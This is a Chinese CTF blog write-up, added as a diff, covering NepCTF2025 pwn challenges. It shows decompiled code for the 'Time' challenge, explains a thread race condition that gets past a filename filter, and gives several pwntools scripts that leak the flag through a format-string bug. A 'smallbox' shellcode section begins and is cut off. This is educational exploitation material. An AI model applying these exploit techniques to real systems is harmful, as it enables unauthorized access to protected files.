@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="参考blog(https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-287806.htm#msg_header_h3_0) Timemian 12345678910111213141516void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  pthread_t newthread[2]; &#x2F;&#x2F; [rsp+0h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF2025-部分pwn的wp(复现)">
+<meta property="og:url" content="http://linkpwn.github.io/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="参考blog(https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-287806.htm#msg_header_h3_0) Timemian 12345678910111213141516void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  pthread_t newthread[2]; &#x2F;&#x2F; [rsp+0h">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-01T00:34:14.000Z">
+<meta property="article:modified_time" content="2025-08-07T01:57:19.717Z">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://linkpwn.github.io/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NepCTF2025-部分pwn的wp(复现) | 网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NepCTF2025-部分pwn的wp(复现)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-08-01 08:34:14" itemprop="dateCreated datePublished" datetime="2025-08-01T08:34:14+08:00">2025-08-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-08-07 09:57:19" itemprop="dateModified" datetime="2025-08-07T09:57:19+08:00">2025-08-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>参考blog(<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0</a>)</p>
+<h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>mian</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_2A31();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_2B0F() )</span><br><span class="line">      ;</span><br><span class="line">    pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sub_2A31()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_2A31</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, byte_50A0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you all file names in the current directory!&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">  argv[<span class="number">2</span>] = <span class="string">&quot;-al&quot;</span>;</span><br><span class="line">  argv[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    execve(<span class="string">&quot;/bin/ls&quot;</span>, argv, <span class="number">0LL</span>);</span><br><span class="line">  wait(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck :-)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sub_2B0F</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_2B0F</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input file name you want to read:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, file);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(file, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag is not allowed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>start_routine</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-46Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-468h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-464h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-400h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1000</span>]; <span class="comment">// [rsp+80h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+468h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1329(v6);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(file);</span><br><span class="line">  sub_1379(v6, file, v1);</span><br><span class="line">  sub_14CB(v6, v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you last file name content in md5:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> __int8)v7[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">999</span>; ++j )</span><br><span class="line">    buf[j] = <span class="number">0</span>;</span><br><span class="line">  fd = open(file, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, buf, <span class="number">0x3E8u</span>LL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_50A0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; ,your file read done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file not found!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里在start_routine的printf(byte_50A0);有格式化字符串漏洞很明显我们要把读入的flag通过的格式化字符串泄露出来。</p>
+<p>可是在sub_2B0F读入的文件名对flag进行了过滤。这里就要了解一下进程和线程的关系了。</p>
+<p><strong>线程与进程的基本关系（复习）</strong></p>
+<ul>
+<li><strong>进程（Process）</strong>：操作系统资源分配的基本单位。每个进程拥有独立的内存空间、文件描述符、环境变量等。进程之间相互隔离，通信需要通过 IPC（如管道、消息队列）。</li>
+<li><strong>线程（Thread）</strong>：进程内的执行单元（轻量级进程）。多个线程共享同一进程的资源（如内存、文件描述符），但每个线程有自己的栈、寄存器和程序计数器。线程切换开销小，适合并发任务。</li>
+</ul>
+<p><strong>线程竞争（Race Condition）的定义和原因</strong></p>
+<ul>
+<li><strong>定义</strong>：当多个线程同时读写共享资源（如 <code>filename</code>），且没有同步机制（如锁）时，程序的执行结果依赖于线程调度的时序，导致不一致或错误。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">时间   事件</span><br><span class="line">----  ----</span><br><span class="line">t0    用户输入 &quot;temp.txt&quot; → main 线程设置 filename = &quot;temp.txt&quot;</span><br><span class="line">t1    main 启动 work 线程</span><br><span class="line">t2    work 线程开始 MD5 计算（耗时操作，持续到 t2+100ms）</span><br><span class="line">      ↳ 在此期间，main 线程被挂起（open 延迟）</span><br><span class="line">t2+50ms 用户输入 &quot;flag&quot; → main 线程设置 filename = &quot;flag&quot;（覆盖）</span><br><span class="line">t2+100ms work 线程完成 MD5 计算</span><br><span class="line">t2+101ms main 线程恢复，执行 open(filename) → 打开 &quot;flag&quot; 文件</span><br></pre></td></tr></table></figure>
+
+<p>再用格式化字符串泄露flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello aaaa0x71a74c1fe8a0(nil)(nil)0x6(nil)0x10000000000x3000003e80x2000x36c63f9b4b69cc070x2bc422698ba00f710x80656d6974(nil)(nil)(nil)(nil)(nil)(nil)0x20(nil)0x36c63f9b4b69cc070x2bc422698ba00f710x10102464c457f(nil)0x1003e00030x12400x400x41980x380040000000000x1c001d0040000d0x4000000060x400x400x400x2d80x2d80x80x4000000030x318 ,your file read done!</span><br></pre></td></tr></table></figure>
+
+<p>把16进制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80656d6974</span> ---&gt; time</span><br></pre></td></tr></table></figure>
+
+<p>来算一下它在那个位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello aaaa</span><br><span class="line">0x71a74c1fe8a0 (nil (nil) 0x6 (nil) 0x1000000000 0x3000003e8 0x200 0x36c63f9b4b69cc07 0x2bc422698ba00f71 0x80656d6974 (nil) (nil) (nil) (nil) (nil) (nil) 0x20 (nil) 0x36c63f9b4b69cc07 0x2bc422698ba00f71 0x10102464c457f (nil) 0x1003e0003 0x1240 0x40 0x4198 0x38004000000000 0x1c001d0040000d 0x400000006 0x40 0x40 0x40 0x2d8 0x2d8 0x8 0x400000003 0x318 ,your file read done!  </span><br></pre></td></tr></table></figure>
+
+<p>文件在12的位置，但是我们不知道内容在什么位置，我在本地创建一个fake:aaaa来算一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello aaaa</span><br><span class="line">0x7264a8ffe8a0 (nil) (nil) 0x6 (nil) 0x1000000000 0x3000003e8 0x200 0x9c9604acef9d4c14 0x94a18eaaefd8fa7b 0x80656b6166 (nil) (nil) (nil) (nil) (nil) (nil) 0x20 (nil) 0x9c9604acef9d4c14 0x94a18eaaefd8fa7b 0xa61616161  (nil) (nil) (nil) (nil) (nil) (nil)</span><br><span class="line">(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil) ,your file read done!</span><br></pre></td></tr></table></figure>
+
+<p>在22的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置远程连接参数</span></span><br><span class="line">HOST = <span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化连接</span></span><br><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式字符串漏洞利用负载</span></span><br><span class="line">leak_payload = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">12</span>+<span class="number">9</span>&#125;</span>$p&quot;</span>  <span class="comment"># 起始地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    leak_payload += <span class="string">f&quot;-%<span class="subst">&#123;<span class="number">13</span>+<span class="number">9</span>+i&#125;</span>$p&quot;</span>  <span class="comment"># 连续泄露后续16个地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送名称触发漏洞</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;please input your name:\n&quot;</span>, leak_payload.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分阶段读取文件</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>, <span class="string">b&quot;time&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>, <span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>理论上是可以的但是没通，实际上也是可以的，因为别的师傅打出来，我没复现出来。</p>
+<p>原作者的exp(<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0</a>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">name=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">12</span>+<span class="number">9</span>&#125;</span>$p&quot;</span>.encode()</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    name+=<span class="string">f&quot;-%<span class="subst">&#123;<span class="number">13</span>+<span class="number">9</span>+i&#125;</span>$p&quot;</span>.encode()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;please input your name:\n&quot;</span>,name)</span><br><span class="line">file=<span class="string">b&quot;time&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>,file)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>,<span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>官方exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./time&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name:\n&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;%28$p.%27$p.%26$p.%25$p.%24$p.%23$p.%22$p.%21$p.%20$p&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a>smallbox</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] please input your shellcode: &quot;</span>);</span><br><span class="line">    v4 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> 